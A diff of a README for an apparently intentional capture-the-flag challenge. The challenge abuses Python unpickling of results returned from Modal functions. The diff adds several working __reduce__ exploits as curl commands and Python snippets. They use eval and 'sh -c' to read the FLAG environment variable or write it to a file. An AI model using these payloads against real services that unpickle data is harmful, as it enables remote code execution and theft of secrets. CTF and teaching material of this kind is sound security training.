@@ -28,7 +28,6 @@ modal-ctf/
 │   └── index.html       # Web interface with CTF instructions
 ├── requirements.txt     # Python dependencies
 ├── deploy_modal.sh      # Deploy Modal function to cloud
-├── start_server.sh      # Start the CTF server
 └── README.md           # This file
 ```
 
@@ -44,7 +43,7 @@ modal-ctf/
 
 ```bash
 export FLAG="CTF{your_secret_flag_here}"
-./start_server.sh
+./start_docker.sh
 ```
 
 ## Detailed Setup
@@ -57,12 +56,20 @@ The server accepts raw Python code as the POST body (not JSON):
 # Simple test
 curl -X POST http://localhost/execute -d 'print("Hello"); 42'
 
-# Exploit example
-curl -X POST http://localhost/execute -d 'class E:
+# Working exploit - multi-line class definition
+curl -X POST http://localhost/execute --data-binary @- <<'EOF'
+class FlagExploit:
     def __reduce__(self):
         import os
-        return (eval, ("__import__(\"os\").environ.get(\"FLAG\", \"No flag\")",))
-E()'
+        return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))
+
+FlagExploit()
+EOF
+
+# One-liner exploit
+curl -X POST http://localhost/execute --data-binary @- <<'EOF'
+type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
+EOF
 ```
 
 ## How It Works
@@ -76,14 +83,47 @@ E()'
 
 ## The Exploit
 
+The vulnerability occurs because Modal pickles/unpickles the result when returning it from the remote function. If the result object has a `__reduce__` method, it gets executed during unpickling on the host.
+
+### Working Exploits
+
+#### Multi-line Class Definition
+
 ```python
 class FlagExploit:
     def __reduce__(self):
-        # This runs on the HOST during unpickling
         import os
         return (eval, ("__import__('os').environ.get('FLAG', 'No flag')",))
 
-FlagExploit()  # Return this from Modal
+FlagExploit()
+```
+
+#### One-liner Version
+
+```python
+# Create a malicious object in a single expression
+type('E', (), {'__reduce__': lambda s: (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))})()
+```
+
+Both approaches work because:
+1. The class has a `__reduce__` method that gets called during unpickling
+2. When unpickled on the host, it executes code that has access to the FLAG environment variable
+3. The result is returned as part of the JSON response
+
+### Alternative Exploits
+
+```python
+# Using subprocess to get the flag
+class FlagExploit:
+    def __reduce__(self):
+        return (eval, ("__import__('subprocess').check_output(['sh', '-c', 'echo -n $FLAG']).decode()",))
+
+FlagExploit()
+```
+
+```python
+# Writing flag to a file (useful for debugging)
+type('E', (), {'__reduce__': lambda s: (__import__('subprocess').call, (['sh', '-c', 'echo "Flag is: $FLAG" > /tmp/ctf_flag.txt'],))})()
 ```
 
 ## Testing
@@ -118,7 +158,7 @@ python3 -m modal setup
 
 # Set FLAG and start server
 export FLAG="CTF{your_flag_here}"
-./start_server.sh
+./start_docker.sh
 ```
 
 ```
